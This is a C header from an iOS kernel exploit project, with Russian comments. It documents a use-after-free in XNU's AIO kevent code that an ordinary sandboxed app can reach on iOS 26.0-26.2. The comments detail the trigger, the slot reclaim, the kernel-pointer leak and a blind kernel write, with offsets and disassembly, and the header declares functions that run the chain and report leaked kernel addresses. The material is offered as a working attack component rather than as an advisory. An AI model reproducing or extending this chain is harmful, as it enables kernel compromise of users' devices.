// language: C, file: aio_chain.h, target: iOS 26.0-26.2 arm64e, Theos
// Kernel R/W chain: AIO kevent UAF (xnu-12377.62.10, bsd/kern/kern_aio.c).
//
// ЖИВОЙ БАГ В 23C55: knote хранит raw-указатель на aio_workq_entry без
// референса (в 26.3 добавлены aio_entry_ref/aio_entry_unref + флаг
// AIO_KEVENT_REGISTERED). Поэтому доставка события проходит по освобождённой
// записи.
//
// ЭТАПЫ ЦЕПОЧКИ (каждый — отдельный измеримый факт, не «наверное»):
//   1 TRIGGER  lio_listio(SIGEV_KEVENT) -> ядро вешает knote на kqueue,
//               kn_hook = &entry, БЕЗ ref (26.2).
//   2 RECLAIM  aio_return(victim) освобождает слот; следующий aio_read
//               (SIGEV_NONE) занимает тот же слот (LIFO magazine) —
//               в слоте теперь наши поля.
//   3 READ     kevent64 доставляет событие по dangling knote: ядро копирует
//               поля ОСВОБОЖДЁННОЙ записи наружу:
//                 ext[0]=+0x28 errorval, ext[1]=+0x20 returnval,
//                 ident=+0x48 uaiocbp, udata=+0x50 sival_ptr,
//                 ext[2]/ext[3] — остатки буфера ядра (кандидат на утечку).
//               HIT-критерий: ext[1]==RECL_NB && ext[0]==0 => слот наш.
//   4 WRITE    filt_aioprocess на висящей записи делает
//               aio_proc_remove_done_locked() -> TAILQ_REMOVE:
//                 ldr x9,[x1,#24]   ; tqe_prev  (slot+0x18)
//                 ldr x10,[x9]     ; *tqe_prev
//                 cmp x10,x1       ; проверка согласованности (panic мимо)
//                 ldr x8,[x8]      ; tqe_next  (slot+0x10)
//                 str x8,[x9]      ; *** WRITE: *tqe_prev = tqe_next ***
//                 str xzr,[x10]    ; tqe_prev = NULL (запись в слот)
//               Это запись В ЯДРО, но цель и значение — kernel-указатели
//               (список doneq процесса): what/where-контроля нет (см.
//               Docs/b12_t3_zones.md). Наблюдаемо: после доставки донор,
//               который занимал слот, уже снят с doneq ядром -> aio_return
//               на нём отдаёт EINVAL, а на остальных донорах — их nbytes.
//   5 VERDICT  сводка: read-примитив / blind-write / что нужно для полного R/W.
//
// ДОСТУП: обычное sandbox-приложение (aio_read + kqueue + kevent64).

#ifndef NK_AIO_CHAIN_H
#define NK_AIO_CHAIN_H

#include <stdint.h>

typedef struct {
    int      attempts;
    int      hits;             /* доставка по dangling knote (UAF подтверждён) */
    int      silent;           /* событие не пришло (окно мимо)                */
    int      panics;           /* ребутов за прогон (считает штурман)         */
    int      trigger_ok;       /* этап 1: knote заведён                        */
    int      reclaim_ok;       /* этап 2: слот переиспользован нашим donor'ом  */
    int      read_ok;          /* этап 3: поля прочитаны из слота             */
    int      leak_ok;          /* этап 3: найден kernel VA в полях события     */
    int      write_ok;         /* этап 4: blind write подтверждена             */
    uint64_t leak_va;
    char     leak_field[16];
    uint64_t last_ext0;
    uint64_t last_ext1;
    uint64_t last_ident;
    uint64_t last_udata;
    uint64_t last_fflags;
    uint64_t last_ext2;
    uint64_t last_ext3;
    uint64_t write_target;     /* адрес, куда ядро записало (если зафиксирован) */
} nk_chain_stat_t;

/* Полная цепочка. attempts — попыток триггера (1..300).
 * Возврат: 0 если есть хотя бы один HIT, -1 иначе. */
int nk_krw_chain_run(int attempts, nk_chain_stat_t *out);

/* Вердикт цепочки текстом (для UI и лога). */
const char *nk_chain_verdict(const nk_chain_stat_t *st);

/* Поле, из которого взят kernel VA ("ext2", "udata", ...). */
const char *nk_chain_leak_field(const nk_chain_stat_t *st);

#endif
